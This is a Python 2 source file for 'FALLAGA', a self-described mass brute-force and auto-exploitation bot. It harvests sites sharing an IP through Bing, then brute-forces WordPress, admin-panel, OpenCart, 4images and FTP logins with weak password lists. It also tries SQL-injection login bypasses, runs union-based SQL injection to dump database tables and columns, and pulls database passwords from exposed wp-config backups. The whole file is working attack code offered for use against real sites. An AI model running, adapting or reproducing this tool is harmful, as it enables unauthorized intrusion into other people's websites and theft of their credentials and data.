# -*- coding: utf-8 -*-
'''
FALLAGA Is A Brute Force Bot - Speed Brute Force Attack - Mass Attack - Auto Grabber
You May Change somethings In the Config Zone
Types Of Brute :
1 ) Wordpress Attack + Auto Grab Username
2 ) Joomla ! Attack 
3 ) Admin Panel ( All Scripts ) : Attack 
4 ) Anything -_-
5 ) Open Cart Cms
7 ) 4images Attacker
8 ) Check Sqli Vulnerabilities 
9 ) Check Upload Vulnerabilities 
10 ) Grab Users    
'''
#!/usr/bin/python
#~~~~~~~~~~~~
#Import Zone 
#--
try :
     import mechanize
except :
     print " |- Please Install Mechanize First !"
#--
import urllib
import urllib2
import httplib
import cookielib
import re
import requests as xsec
from time import sleep
from threading import Thread
import socket
from ftplib import FTP
#~~~~~~~~~~~~
#~Variables And Lists
jcelist = []
bad = [404,403,401,501,406,400,500,301,302]
jolist = []
wplist = []
adlist = []
pmalist = []
oclist = []
fourilist = []
sqlilist = []
upllist = []
users = []
cpusers = []
dachlist = []
sites = []
FCKeditor = []
adsite = []
wpconfigbak = []
urls = []
passwords = ["admin","123123","1234"]
passlist = ["admin"]
#------------------------------------------------------------
joexploits = ['/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20']
com_media_inj = "/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=7"
#------------------------------------------------------------
configsinc= ["/config.php.inc","/config.inc","/includes/config.php.inc","/includes/config.inc","/includes/db.inc","/includes/db.php.inc","/admin/includes/config.inc.php"]
configsbak= ["/config.php.bak","/config.bak","/includes/config.php.bak","/includes/config.bak","/includes/db.bak","/includes/db.php.bak","/admin/includes/config.inc.php.bak","/db/db.php.bak","/db/config.php.bak"]
configsbaksym= ["/config.php~","/config~","/includes/config.php~","/includes/config~","/includes/db~","/includes/db.php~","/admin/includes/config.inc.php~","/db/db.php~","/db/config.php~"]
wpbackup = ["/wp-config.php.bak","wp-config.php~","wp-config.php_bak","/wp-config.php-bak"]
dirs = ["/upload/","/uploads/","/documents/","/files/","/resume/","/resumes","/files/","/upload_cv/","/cv_upload/","/pictures/","/hpage/","/files/upload/","/files/uploads/","/upload/files/"]
jot = {'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1': 'com_fabrik' ,
          '/index.php?option=com_jvehicles&task=agentlisting&aid=31337': 'com_Jvehicles',
		  '/index.php?option=com_virtuemart' : 'com_virtuemart',
          '/index.php?option=com_kunena' : 'com_kunena'
		  }
wpt = {"/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php" : "Creative Contact Form",
            "/wp-content/uploads/slideshow-gallery/" : "slideshow gallery",
            "/wp-content/uploads/feuGT_uploads/" : "feuGT",
			"/themes/dandelion/functions/upload-handler.php" : "dandelion"
           }
#---------------------------
error = ["Unknown","SQL","sql"]
admins = []
columns = []
db = []
dumps = []
payload_db = "group_concat(0x3c666f6e7420636f6c6f723d2279617373696e6f78223e,database(),0x3c2f666f6e743e)"
payload_tab = "group_concat(0x3c666f6e7420636f6c6f723d2279617373696e6f78223e,table_name,0x3c2f666f6e743e)"
final_tab = "+from+information_schema.tables+where+table_schema =database()--"
payload_col = "group_concat(column_name)"
final_col = "+from+information_schema.columns+where+table_schema=database()--"
#------------------------------------------------------------
ips = open("ip.txt","r")
#~~~~~~~~~~~~
#~Config Zone
excpl = False #~extract cpanel users To list
attackfio = True  #~Brute force 4images
#~~~~~~~~~~~~
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    CYAN = '\033[96m'
class colors():
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
#~~~~~~~~~~~~~
def logo():
    print bcolors.CYAN+ '''                _


               
  _____ _    _ ______ ____  
 |_   _| |  | |  ____|  _ \ 
   | | | |__| | |__  | |_) |
   | | |  __  |  __| |  _ < 
  _| |_| |  | | |____| |_) |
 |_____|_|  |_|______|____/ 
                            
                              
                                         


                      Private Version 
		      Python B0xT                                      


'''
logo()
#~~~~~~~~~~~~~
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
#~~~~~~~~~~~~~
def grabjo(ip):
    print bcolors.OKBLUE  + "|- Grabbing Joomla "
    page = 1
    while page <= 21:
		bing = "http://www.bing.com/search?q=ip%3A"+ip+"+index.php?option=com&count=50&first="+str(page)
		openbing  = urllib2.urlopen(bing)
		readbing = openbing.read()
		findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
		for i in range(len(findwebs)):
			jmnoclean = findwebs[i]
			findjm = re.findall('(.*?)index.php', jmnoclean)
			jolist.extend(findjm)

		page = page + 10
    print bcolors.OKGREEN + "|- Grabbed : " + str(len(jolist)) + " Joomla Sites "
#~~~~~~~~~~~~~
def grabwp(ip):
        print bcolors.OKBLUE  + "|- Grabbing Wordpress "
	page = 1
	while page <= 21:
		bing = "http://www.bing.com/search?q=ip%3A"+ip+"+?page_id=&count=50&first="+str(page)
		openbing  = urllib2.urlopen(bing)
		readbing = openbing.read()
		findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
		for i in range(len(findwebs)):
			wpnoclean = findwebs[i]
			findwp = re.findall('(.*?)\?page_id=', wpnoclean)
			wplist.extend(findwp)
		page = page + 10
        print bcolors.OKGREEN + "|- Grabbed : " + str(len(wplist)) + " Wordpress Sites "
#~~~~~~~~~~~~~
def admingrabber(ip):
    try :
        print bcolors.OKBLUE  + "|- Grabbing Admin Panels "
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+admin&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites :   
                    dachlist.append(i)				
                    if len(dachlist) < 5	:					
                        response = urllib2.urlopen(i).read()
                        admins = re.findall('type="password"',response)
                        if admins :
                                  adlist.append(i)
                page = page + 10
    except :
        pass
def counta():
    seta = unique(adlist)
    for admin  in seta :
        print bcolors.FAIL + "|-> Admin Panel > " + str(admin)		
    print bcolors.OKGREEN + "|- Grabbed " + str(len(adlist)) + " Admin Panels"	    
def grabadfs():
    sts = unique(sites)
    print bcolors.OKBLUE + "|-> Grabbing From sites "
    try:
         for site in sts :
	          a=urllib.urlopen(site + "/admin").read()
                  find = re.findall('type="password"',a)
                  np = re.findall('name="log"',a)
                  if find and not np :
                         print bcolors.FAIL + "|-> admin panel from site >  " + str(site) + "/admin/"
                         adlist.append(str(site) + "/admin/")
    except :
        pass
#~~~~~~~~~~~~~
def pma(ip):
    print bcolors.OKBLUE  + "|- GRABBING PHPMYADMIN"
    try:
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+phpmyadmin&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites:
                    response = urllib2.urlopen(i).read()
                    upl = re.findall('username"',response)
                    if upl :
                                            pmalist.append(i)     										
                page = page + 10
        print bcolors.OKGREEN + "|- Grabbed " + str(len(pmalist)) + " Php My Admin"	
    except :
	    pass  
#~~~~~~~~~~~~~
def graboc(ip):
    print bcolors.WARNING  + "|- Grabbing OpenCart"
    try:
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+admin&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites:
                    response = urllib2.urlopen(str(i) ).read()
                    upl = re.findall('>OpenCart<',response)
                    if upl :
                                            print bcolors.FAIL + "|-> Open Cart > " + str(i)
                                            oclist.append(i)
                                            
                page = page + 10
        print bcolors.OKGREEN + "|- Grabbed " + str(len(oclist)) + " Open Cart Sites"	
    except :
	    pass  
#~~~~~~~~~~~~~
def grabfour(ip):
        print bcolors.OKBLUE  + "|- Grabbing OpenCart"
        lista = []
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+powered+by+4images&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites:
                        print bcolors.FAIL + "|-> 4images > " + str(i)
                        a= i.split("index.php", 2)
                        fourilist.append(a)	
                page = page + 10
        print bcolors.OKGREEN + "|- Grabbed " + str(len(fourilist)) + " 4images Sites"	
def grabsqli(ip):
    try :
        print bcolors.OKBLUE  + "|- Grabbing Sqli "
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+.php?id=&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites :
                            try :
                                      response = urllib2.urlopen(i).read()									 
                                      checksqli(i)	
                            except urllib2.HTTPError, e:
                                       str(sites).strip(i)
								   
                page = page + 10 
    except : 
         pass
def checksqli(sqli):
                            responsetwo = urllib2.urlopen(sqli + "'").read()
                            find = re.findall("sql",responsetwo)
                            if find:
                                            sqlilist.append(sqli)    

def count():
    set = unique(sqlilist)
    for sqli in set :
         print bcolors.FAIL + "|-> Sql Injection > " + str(sqli)	
    print bcolors.OKGREEN + "|- Grabbed " + str(len(set)) + " Sql Injection Sites"        	
#~~~~~~~~~~~~~
def grabupl(ip):
    print bcolors.OKBLUE  + "|- Grabbing Uplaods"
    try:
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+upload&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites:
                    response = urllib2.urlopen(i).read()
                    upl = re.findall('type="file"',response)
                    if upl :
                          print bcolors.FAIL + "|-> Upload > " + str(i)
                          upllist.append(i)
                page = page + 10	
    except :
	    pass
def countu():
    set = unique(upllist)
    for upl in set :
         print bcolors.FAIL + "|-> Upload > " + str(upl)	
    print bcolors.OKGREEN + "|- Grabbed " + str(len(set)) + " Upload Sites"
#~~~~~~~~~~~~~
def grabins(ip):
    print bcolors.OKBLUE  + "|- Grabbing Install"
    try:
         for wp in wplist :
	          a=urllib.urlopen(wp + "/wp-admin/install.php").read()
                  find = re.findall('type="text"',a)
                  if find :
                         print bcolors.FAIL + "|-> Install >  " + str(wp) + "/wp-admin/install.php"
    except :
        pass
#~~~~~~~~~~~~~
def grab(site):
    try :
        sites.append(site)
        site1 = site.replace("http://","")
        site2 = site1.replace("www.","")
        site3 = site2.replace("/","")
        site4 = site3.replace("","")
        site5,dach = site4.split(".")
        if len(users) < 50 :
            users.append(site5)
    except :
        pass
def extractserver(ip):
    try:
        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sitess = findwebs
                for i in sitess:
                    sites.append(i)
                    grab(i)		
                print bcolors.WARNING + "|-> grabbed  " + str(len(sites)) + " sites"				
                page = page + 21
    except :
	    pass

def grabcpu(ip):
    try :
        print bcolors.OKBLUE + "|- Ready To Check " + str(len(users)) + " Users "
        for user in unique(users) :
            resp = urllib2.urlopen("http://" + ip + '/cgi-sys/guestbook.cgi?user=%s' % user).read()	
            findcpuser = re.findall(user , resp)	
            if findcpuser :
                 print bcolors.FAIL + "|-> Cpanel User > " + user 
                 cpusers.append(user)
    except :
        pass
        print bcolors.FAIL + '|-> Cpanel Not Installed'
def extractcpu():
    print bcolors.OKGREEN + "|- Grabbed " + str(len(cpusers)) + " Users"    
def extractcpul():
    if excpl == False :
        for user in cpusers :
                 with open( 'cpu.txt', 'a') as f:
                          f.write(user + '\n')
#~~~~~~~~~~~~~
thd = []
def user(site , passlist):
	userlist = list()
	i = 1
	# you can edit to whatever number of users you want to enumerate
	while( i <= 5 ) :
		url = site + '?author=%i' % i
		try:
			data = urllib2.urlopen(url).read()
			# cleaning the sh*t
			re1 = re.findall("<title>(.*?)</title>" , data)
			user = re.search("(.*?) |" , re1[0]).group(1)
			userlist.append(user)
		except:
			pass
		i += 1
	wpbrute(site , userlist, passlist)
	return site
def wpbrute(site , userlist , passlist):
	for user in userlist:
		# if enumeration returns no user
		if user == "" :
			userlist[0] = "admin"
			del userlist[1:]
	
	for user in userlist :
		for password in passlist:
			try:
				# found the answer on stackoverflow
				cj = cookielib.CookieJar()
				opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
				login_data = urllib.urlencode({'log' : user, 'pwd' : password})
				opener.open(str(site) + 'wp-login.php', login_data)
				resp = opener.open(str(site)+'wp-admin')
				final = resp.read()
				if '<li id="wp-admin-bar-logout">' in final:
					print bcolors.OKGREEN +  '\n|-Wordpress | Cracked   ' '\n|-Hostname : ' + str(site) + '\n|-Username: ' + str(user) + ' \n|-Password: '+str(password)  + '\n'
					break
					
			except:
				pass
def attackwp():
     print bcolors.OKGREEN  + "|- Brute Forcing Wordpress "
     for wp in wplist : 
             user(wp , passwords)
#~~~~~~~~~~~~~
def getu(line) :
     findu = re.findall('name="(.*?)"' , line)
     for i in range(len(findu)):
                          return findu[i]
def getusername(contentHtml):
                     global username 
                     for line in contentHtml :
                            findwebs = re.findall('type="text"' , line)
                            if findwebs :
                                        username = getu(line)
                                        return username
def getpassword(contentHtml):
                     global passwordinput
                     for line in contentHtml :
                            findwebs = re.findall('type="password"' , line)
                            if findwebs :
                                        passwordinput = getu(line)   
                                        return(passwordinput)										
def bypasswork():
    print bcolors.OKBLUE  +"|- Trying To Bypass " + str(len(adlist)) +  " Admin Panels "
    for ad in adlist:
            try:
                cj = cookielib.CookieJar()
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                login_dat = urllib.urlencode({"username" : "1'or'1", "password" : "1'or'1"})
                opener.open(str(ad), login_dat)
                response = opener.open(str(ad))
                final = response.read()
                if 'type="password' in final:
                     logged = False
                else:
                     print bcolors.OKGREEN + "|- Admin Panel | Bypassed "
                     print "|- Site -> " + str(ad)
            except:
	         pass  
			 
def bruteadmin(site,password):
    try:
                cj = cookielib.CookieJar()
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                opener.open(site)
                response = opener.open(site)
                final = response.readlines()
                getusername(final)
                getpassword(final)
                post = {}
                post[username] = "admin"
                post[passwordinput] = password
                get2 = xsec.post(site, data=urllib.urlencode(post))
                get3 = xsec.get(site)
                if 'type="password"' in get3.text:
                     logged = False
                else:
                     print bcolors.OKGREEN + "|- Admin Panel | ATTACKED"
                     print "|-Site : " + str(site)
                     print "|-USER : admin" 
                     print "|-Password : " + password

    except:
                 print bcolors.FAIL + "|-Fail !"
	         pass    
def brutea():
     adlis = unique(adlist)
     print bcolors.OKBLUE  +"|- Brute Forcing  " + str(len(adlis)) +  " Admin Panels "
     for ad in adlis :
         for pwd in passwords :
             bruteadmin(ad,pwd)		
def inform():
    try :
        print bcolors.WARNING + "|- Informations	"
        for ad in adlist : 
                cj = cookielib.CookieJar()
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                opener.open(ad)
                response = opener.open(ad)
                final = response.readlines()
                getusername(final)
                getpassword(final)
                print bcolors.FAIL + "|-> Host  > " + ad
                print bcolors.FAIL + "|-> Username Input > " + str(username)
                print bcolors.FAIL + "|-> Password Input > " + str(passwordinput)
    except :
         print bcolors.FAIL + "|->Fail To retrive Data !"	
#~~~~~~~~~~~~~
def bruteoc(siteh,passs):
            try :
                     cookie_jar = cookielib.CookieJar() 
                     login_form_seq = [ 
                     ('username', 'admin'), 
                     ('password', passs)] 
                     login_form_data = urllib.urlencode(login_form_seq) 
                     opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) 
                     site = opener.open(siteh, login_form_data).read() 
                     if re.search('type="password"',site): 
                            logged = False
                     else :
                            print (bcolors.OKGREEN + "|- OpenCart HACKED \n|- Host :  " + str(siteh) + "\n|- Username :  admin \n|- Password : " + str(passs))
            except :
                    pass
def attackoc():
    for oc in oclist :
	    for passs in passwords :
		        bruteoc(oc,passs)
#~~~~~~~~~~~~~
def brutefi(siteh,passs):
            try :
                     cookie_jar = cookielib.CookieJar() 
                     login_form_seq = [ 
                     ('loginusername', 'admin'), 
                     ('loginpassword', passs)] 
                     login_form_data = urllib.urlencode(login_form_seq) 
                     opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) 
                     site = opener.open(siteh, login_form_data).read() 
                     if re.search('type="password"',site): 
                            logged = False
                     else :
                            print (bcolors.OKGREEN + "|- Four Images HACKED \n|- Host :  " + str(siteh) + "\n|- Username :  admin \n|- Password : " + str(passs))
            except :
                    pass
def attackfi():
    for fi in fourilist :
	    for passs in passwords :
		        bruteoc(fi,passs)
#~~~~~~~~~~~~~
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
#-------------------------------
def grabuser(victime):
    try:
     global username
     userurl = victime + '?author=1' #~ Get Username By ID
     find = urllib2.urlopen(userurl).read()
     username = re.search("(.*?) |" , re1[0]).group(1)
    except:
	 username = "admin"
#---------------------------------
def bruteforcer(site,username,password):
    try :
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        login_data = urllib.urlencode({'log' : username, 'pwd' : password})
        opener.open(str(site) + '/wp-login.php', login_data)
        response = opener.open(str(site)+'/wp-admin')
        final = response.read()
        if '<li id="wp-admin-bar-logout">' in final:
	        print C + "|------------------------|"
	        print C + "| Successfully Attacked "
	        print C + "| Site : " + str(site)
	        print C + "| User :" + username
                print C + "| Pass :" + password
    except :
        pass
def attackwp():
    print bcolors.OKBLUE + "|- Attack wordpress "
    for site in wplist :
	        for passes in passwords :
                                        grabuser(site)
				        bruteforcer(site,username,passes)   
#----------------------------------------------
def jce_checker(joomla):
    comjce = "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20"
    try:
        html = urllib2.urlopen(joomla + comjce).readlines()
        for line in html:
            if re.findall('Image Manager', line):

                jcelist.append(joomla)
    except urllib2.URLError:
         pass
def startjce():
     print bcolors.OKBLUE + "|================ Com Jce ================| "
     for joom in jolist :
                 if "http" in joom :
                      jce_checker(joom)
     for jcesite in unique(jcelist ):
                print bcolors.FAIL + "|-> JCE  > " + str(jcesite)
     print bcolors.OKBLUE + "|================ Com Jce ================| "
#~~~~~~~~~~~~~
def grabconfinc():
          print bcolors.OKBLUE + "|- Checking From Config Inc files "
          for sit  in unique(sites) :
                for co in configsinc :
                        ur = urllib.urlopen(sit + co).getcode()
                        if ur == 200 :
                               result = urllib2.urlopen(sit + co).read()
                               find = re.findall("404",result)
                               if find :
                                          found = False 
                               else :
                                           print bcolors.FAIL + "|-> Config Inc > " + str(sit + co)
def grabconfigbak():
          print bcolors.OKBLUE + "|- Checking From Config backup files"
          for sit  in unique(sites) :
                for co in configsbak :
                        ur = urllib.urlopen(sit + co).getcode()
                        if ur == 200 :
                               result = urllib2.urlopen(sit + co).read()
                               find = re.findall("404",result)
                               if find :
                                          found = False 
                               else :
                                           print bcolors.FAIL + "|-> Config backup > " + str(sit + co)										   
def grabconfigsym():
          print bcolors.OKBLUE + "|- Checking From Config backup files (With symbols) "
          for sit  in unique(sites) :
                for co in configsbaksym :
                        ur = urllib.urlopen(sit + co).getcode()
                        if ur == 200 :
                               result = urllib2.urlopen(sit + co).read()
                               find = re.findall("404",result)
                               if find :
                                          found = False 
                               else :
                                           print bcolors.FAIL + "|-> Config backup with symbol > " + str(sit + co)	
def grabconfigwp():
    try :
          print bcolors.OKBLUE + "|- Checking From Config backup files (wordpress) "
          for sit  in unique(wplist) :
                for co in wpbackup :
                        ur = urllib.urlopen(sit + co).getcode()
                        if ur == 200 :
                               result = urllib2.urlopen(sit + co).read()
                               find = re.findall("DB_USER",result)
                               if find :
                                           print bcolors.FAIL + "|-> Wordpress Config > " + str(sit + co)	
                                           wpconfigbak.append(sit + co)		 
    except :
         pass
#-----------------------------------------
def showdb():
    dbu = unique(db)
    for d in dbu :
         print  "|-> Database > " + str(d)
def showtb():
    tbu = unique(admins)
    print "+---------------------+"
    for t in tbu :
         if t == "admin" :
             print  colors.RED + "| " + str(t) 
         else :
             print colors.GREEN + "| " + str(t)
    print "+---------------------+"
def showcl():
    cl = unique(columns)
    print "+---------------------+"
    for c in cl :
         c,t = c.split(">")
         if c == "password" :
             print  colors.RED + "| " + str(c)  + colors.BLUE + "  >  " + colors.RED + str(t)
         else :
             print colors.GREEN + "| " + str(c) + colors.BLUE + "  >  " + colors.RED+ str(t)
    print "+---------------------+"
def showdump():
    du = unique(dumps)
    print "+---------------------+"
    for d in du :
             print colors.GREEN + "| " + str(d)
    print "+---------------------+"
def unstat(stat): #~ Here We Put Our Union Select Statement
    global k
    plus = int(stat) + 1
    n = range(int(plus))
    a = str(n).strip('[]')
    b = str(a).strip('0,')
    k = b.replace(" ", "")
def grabdata(site,inf,col) :
    try :
        co = col.replace(str(inf),str(payload_db))
        resp1 = urllib2.urlopen(site + "+union+select+" + str(co) + "--").read()  
        findu = re.findall('<font color="iheb">(.*?)</font>' , resp1)
        for i in range(len(findu)):
                          db.append(findu[i])
    except :
        pass
def grabtab(site,inf,col):
    try :
        print colors.CYAN + "|-> Try To get Tables"
        co = col.replace(str(inf),"group_concat(0x3c666f6e7420636f6c6f723d2279617373696e6f78223e,table_name,0x3c2f666f6e743e)")
        resp1 = urllib2.urlopen(site + "+union+select+" + str(co) + "+from+information_schema.tables+where+table_schema=database()--").read()  
        findu = re.findall('<font color="iheb">(.*?)</font>' , resp1)
        for i in range(len(findu)):
                          admins.append(findu[i])
    except :
        pass	
def grabcol(site,inf,col):
    try :
        print colors.CYAN + "|-> Try To get columns"
        co = col.replace(str(inf),"group_concat(0x3c666f6e7420636f6c6f723d2279617373696e6f78223e,column_name,0x3e,table_name,0x3c2f666f6e743e)")
        resp1 = urllib2.urlopen(site + "+union+select+" + str(co) + "+from+information_schema.columns+where+table_schema=database()--").read()  
        findu = re.findall('<font color="iheb">(.*?)</font>' , resp1)
        for i in range(len(findu)):
                          columns.append(findu[i])
            
    except :
        pass
def dumpcol(site,inf,col):
        column = raw_input(colors.CYAN + "| Column To dump : ")
        need,table = column.split(">")
        print colors.CYAN + "|-> Try To Dump Column "
        co = col.replace(str(inf),"group_concat(0x3c666f6e7420636f6c6f723d2279617373696e6f78223e," + str(need) +  ",0x3c2f666f6e743e)")
        resp1 = urllib2.urlopen(site + "+union+select+" + str(co) + "+from+" + str(table)).read()  
        findu = re.findall('<font color="Iheb0xx">(.*?)</font>' , resp1)
        for i in range(len(findu)):
                          dumps.append(findu[i])
            
def getsqliinfcol(site,num,col):
     try: 
                i = 1
                while i < num :
                     co = col.replace(str(i),"0x79617373696e6f78")
                     resp1 = urllib2.urlopen(site + "+union+select+" + str(co) + "--").read()  
                     fin = re.findall("Iheb",resp1)
                     if fin :
                         		print  colors.GREEN+ "|-> Infected Column > " + str(i)
                                        grabdata(site,i,col)
                                        showdb()
                                        grabtab(site,i,col)
                                        showtb()
                                        grabcol(site,i,col)
                                        showcl()
                                        dumpcol(site,i,col)
                                        showdump()
                                        i = str(num)
                     i = i + 1					
     except urllib2.HTTPError, e:	
          if e.code == 406 :
               print  colors.RED + "| Got 406"
          if e.code == 403 :
               print  colors.RED + "|- Got 403"	 #~Incha2allah Bypass in next version	 
     except :
        pass
def getsqlicol(site):
    global c
    print  "|- exploiting Sql Injection "
    try :
        c = 0
        while c < 25 :
            response = urllib2.urlopen(site + "+order+by+" + str(c) + "--").read()  
            sqli = re.findall('SQL',response)
            if sqli :
		        i = False
            else :
                a = c + 1
                response = urllib2.urlopen(site + "+order+by+" + str(a) + "--").read() 
                for er in error :
                      sqli = re.findall(er,response)
                      if sqli :
                          print colors.GREEN + "|-> Columns Numbers > " + str(c)
                          num = c
                          unstat(c)
                          c = c + 50
                          break
            c = c +1	
    except :
        print  colors.RED+ "|- Can't Find Columns number "
        pass
										   
def exploitsqli() :
     sqliss = unique(sqlilist)				
     for sq in sqliss :
         getsqlicol(sq)
         getsqliinfcol(sq,c,k)	 
#-------------------------------------------------
def grabpasswords():
     try :
              print bcolors.OKBLUE+ "|---------- Grab Passwords----------| "
	      for conf in wpconfigbak :
                     reads = urllib2.urlopen(conf).read()
                     password = re.findall("'DB_PASSWORD', '(.*?)'", reads)
                     for passs in password : 
					      print bcolors.FAIL + "|->             " + str(passs) + "            <-|"
              print bcolors.OKBLUE+ "|---------- Grab Passwords----------| "
     except :
        pass
#-------------------------------------------------
def grabuploadedlink():
     try :
            for upl in upllist :
                    site = upl.replace("http://","")
                    site = re.findall("(.*?)/", site)
                    final = "http://" +  site[0] + "/" 
                    for dir in dirs :
                              currentcode = urllib.urlopen(final + dir).getcode()
                              if currentcode == 200 :
                                                                 print bcolors.OKGREEN + "|- Found Directory > " + str(final + dir)												
     except :
        pass
#-------------------------------------------------
def scanjoomla():
     try :
            print bcolors.OKBLUE + "|- Scanning Joomla From most Known Components"
            for jo in jolist :
                    for link,name in jot.iteritems() :
                                currentcodetwo = urllib.urlopen(jo + "/" + str(link)).getcode()
                                if currentcodetwo == 200 :
                                            jocheck = urllib2.urlopen(jo + "/" + str(link)).read()
                                            found = re.findall(str(name), jocheck)
                                            if found :
                                                    print bcolors.FAIL + "|-> Found Joomla " + bcolors.OKGREEN + str(name) + bcolors.FAIL + " In " + bcolors.OKGREEN + str(jo)
     except :
         pass
#-------------------------------------------------
def check(site): 
      try :
           ur = urllib2.urlopen(site + "/" + com_media_inj).read()
           check = re.findall('id="uploadForm" name="uploadForm" method="post" enctype="multipart/form-data">',ur)
           if check :
               print bcolors.FAIL + "|-> Com Media  > " + site
      except :
         pass	  
def com_mediascan():
          print bcolors.OKBLUE + "|================ Com Media ================| "
          for jo in jolist :
                  check(jo)     
          print bcolors.OKBLUE + "|================ Com Media ================| "				  
#-------------------------------------------------
def scanwp():
            print bcolors.OKBLUE + "|- Scanning Wordpress From most Known plugins"
            for wp in wplist :
                    for link,name in wpt.iteritems() :
                                currentcodetwo = urllib.urlopen(wp + "/" + str(link)).getcode()
                                if currentcodetwo == 200 :
                                            print bcolors.FAIL + "|-> Found Wordpress Plugin " + bcolors.OKGREEN + str(name) + bcolors.FAIL + " In " + bcolors.OKGREEN + str(wp)
#-------------------------------------------------
def bing_check(ip):
    page = 1
    lista = []
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + ip + "+*.php&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                x = findwebs[i]
                urls.append(x)
        except:
            pass

        page += 50
def scanuplcheck() :
      print bcolors.OKBLUE + "|- Ready To check Upload From Crawled Urls"
      try :
               for url in unique(urls) :
                  aa =urllib2.urlopen(url).read()
                  bb = re.findall('type="file"',aa)
                  if bb :
                             print bcolors.FAIL + "|-> Upload From Crawl > " + url
      except :
            pass
def scansqlicheck() :
      print bcolors.OKBLUE + "|- Ready To check sqli From Crawled Urls"
      try :
               for url in unique(urls) :
                  aa =urllib2.urlopen(url + "'").read()
                  bb = re.findall('SQL',aa)
                  if bb :
                             print bcolors.FAIL + "|-> sql Injection From Crawl > " + url
      except :
            pass
def bruteftp(ip,user,password):
    try:
        ftp = FTP(ip)
        ftp.login(user, password)
        print (bcolors.OKGREEN + '|-> FTP Attacked with username ' + str(user) + ' And password is '  + str(password))   
        ftp.quit()
    except:
        pass
def attackftp(ip) :
    try :
           print bcolors.OKBLUE + "|- Brute Forcing Ftp "
           for user in cpusers :
                 for password in passwords :
                        bruteftp(ip,user,password)
    except :
            pass	
#~~~~~~~~~~~~~
def main(ip):
    del cpusers[:]
    del jolist[:]
    del wplist[:]
    del adlist[:]
    del sqlilist[:]
    del upllist[:]
    del sites[:]
    del jcelist[:]
    del urls[:]
    del wpconfigbak[:]
    ip = socket.gethostbyname(ip)
    print bcolors.WARNING + "|-> Target : " + str(ip)
    extractserver(ip)
    grabwp(ip)
    grabjo(ip)
    grabins(ip)  
    admingrabber(ip)
    grabadfs()
    counta()
    grabsqli(ip)
    count()
    grabupl(ip)
    grabuploadedlink()
    brutea()
    grabcpu(ip)
    extractcpu()	
    extractcpul()
    grabfour(ip)
    graboc(ip)
    if attackfio == True :
        attackfi()
    grabconfigwp()
    grabpasswords()
    startjce()
    com_mediascan()
    scanjoomla()
    attackftp(ip)
#~~~~~~~~~~~~~
for ip in ips :
    ip = ip.rstrip()
    main(ip)	
#~~~~~~~~~~~~~